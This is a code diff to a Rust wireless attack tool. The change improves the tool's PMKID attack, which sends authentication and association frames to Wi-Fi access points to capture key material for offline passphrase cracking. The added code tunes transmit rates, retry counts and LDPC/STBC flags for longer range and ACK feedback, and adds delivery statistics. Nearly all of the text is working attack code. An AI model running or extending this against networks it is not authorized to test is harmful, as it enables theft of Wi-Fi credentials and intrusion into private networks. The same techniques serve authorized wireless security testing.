@@ -30,6 +30,7 @@ use std::time::{Duration, Instant};
 
 use crate::adapter::SharedAdapter;
 use crate::core::{EventRing, MacAddress, TxOptions};
+use crate::core::frame::{TxFlags, TxRate};
 use crate::core::parsed_frame::{FrameBody, DataPayload};
 use crate::engine::capture::{self as capture_engine, CaptureDatabase, CaptureEvent};
 use crate::store::Ap;
@@ -204,6 +205,9 @@ pub struct PmkidInfo {
     pub aps_no_pmkid: u32,
     pub aps_no_response: u32,
 
+    // === TX Feedback ===
+    pub tx_feedback: crate::core::TxFeedbackSnapshot,
+
     // === Timing ===
     pub start_time: Instant,
     pub elapsed: Duration,
@@ -237,6 +241,7 @@ impl Default for PmkidInfo {
             pmkids_failed: 0,
             aps_no_pmkid: 0,
             aps_no_response: 0,
+            tx_feedback: Default::default(),
             elapsed: Duration::ZERO,
             frames_per_sec: 0.0,
             results: Vec::new(),
@@ -474,6 +479,20 @@ fn run_pmkid_attack(
 ) {
     let start = Instant::now();
     let our_mac = shared.mac();
+    let tx_fb = shared.tx_feedback();
+    tx_fb.reset();
+
+    // TX options: optimized for max range + ACK feedback
+    // We send as our own MAC → ACKs come back to us → firmware can report delivery.
+    // CCK 1M on 2.4GHz gives ~6dB better sensitivity (longer range) than OFDM 6M.
+    // LDPC/STBC improve reliability at range limits on 2x2 adapters.
+    let base_tx_opts = TxOptions {
+        rate: TxRate::Cck1m, // auth/assoc are mgmt frames; overridden per-target for 5GHz
+        retries: 12,
+        flags: TxFlags::WANT_ACK | TxFlags::LDPC | TxFlags::STBC,
+        ..Default::default()
+    };
+
     let mut total_captured: u32 = 0;
     let mut total_failed: u32 = 0;
     let mut _total_no_pmkid: u32 = 0;
@@ -505,9 +524,17 @@ fn run_pmkid_attack(
             info.elapsed = start.elapsed();
         }
 
+        // Per-target TX opts: CCK 1M on 2.4GHz, OFDM 6M on 5/6GHz
+        let tx_opts = if target.channel > 14 {
+            TxOptions { rate: TxRate::Ofdm6m, ..base_tx_opts }
+        } else {
+            base_tx_opts
+        };
+
         let result = attack_single_ap(
             shared, reader, target, params, &our_mac,
             info, events, running, start, idx as u32, targets.len() as u32,
+            &tx_fb, &tx_opts,
         );
 
         match result.status {
@@ -543,6 +570,7 @@ fn run_pmkid_attack(
     {
         let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
         info.elapsed = elapsed;
+        info.tx_feedback = tx_fb.snapshot();
         info.results_count = results.len() as u32;
         if results.len() <= MAX_INFO_RESULTS {
             info.results = results;
@@ -596,6 +624,8 @@ fn attack_single_ap(
     attack_start: Instant,
     index: u32,
     total: u32,
+    tx_fb: &Arc<crate::core::TxFeedback>,
+    tx_opts: &TxOptions,
 ) -> PmkidResult {
     let target_start = Instant::now();
 
@@ -679,7 +709,7 @@ fn attack_single_ap(
             StatusCode::Success,
         );
 
-        if shared.tx_frame(&auth_frame, &TxOptions::default()).is_err() {
+        if shared.tx_frame(&auth_frame, tx_opts).is_err() {
             continue;
         }
 
@@ -731,7 +761,7 @@ fn attack_single_ap(
             result.status = PmkidStatus::Stopped;
         }
         result.elapsed = target_start.elapsed();
-        disassoc_cleanup(shared, our_mac, target, params, events, attack_start, info);
+        disassoc_cleanup(shared, our_mac, target, params, events, attack_start, info, tx_opts);
         shared.unlock_channel();
         push_event(events, attack_start, PmkidEventKind::ChannelUnlocked);
         push_target_complete(events, attack_start, &result);
@@ -772,7 +802,7 @@ fn attack_single_ap(
             None => continue,
         };
 
-        if shared.tx_frame(&assoc_frame, &TxOptions::default()).is_err() {
+        if shared.tx_frame(&assoc_frame, tx_opts).is_err() {
             continue;
         }
 
@@ -889,7 +919,7 @@ fn attack_single_ap(
     }
 
     // Step 4: Cleanup + unlock channel
-    disassoc_cleanup(shared, our_mac, target, params, events, attack_start, info);
+    disassoc_cleanup(shared, our_mac, target, params, events, attack_start, info, tx_opts);
     shared.unlock_channel();
     push_event(events, attack_start, PmkidEventKind::ChannelUnlocked);
 
@@ -903,6 +933,7 @@ fn attack_single_ap(
         if secs > 0.0 {
             info.frames_per_sec = (info.frames_sent + info.frames_received) as f64 / secs;
         }
+        info.tx_feedback = tx_fb.snapshot();
     }
 
     push_target_complete(events, attack_start, &result);
@@ -1137,6 +1168,7 @@ fn disassoc_cleanup(
     events: &Arc<EventRing<PmkidEvent>>,
     attack_start: Instant,
     info: &Arc<Mutex<PmkidInfo>>,
+    tx_opts: &TxOptions,
 ) {
     if !params.disassoc_after {
         return;
@@ -1151,7 +1183,7 @@ fn disassoc_cleanup(
         ReasonCode::DisassocLeaving,
     );
 
-    if shared.tx_frame(&disassoc, &TxOptions::default()).is_ok() {
+    if shared.tx_frame(&disassoc, tx_opts).is_ok() {
         let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
         info.frames_sent += 1;
     }
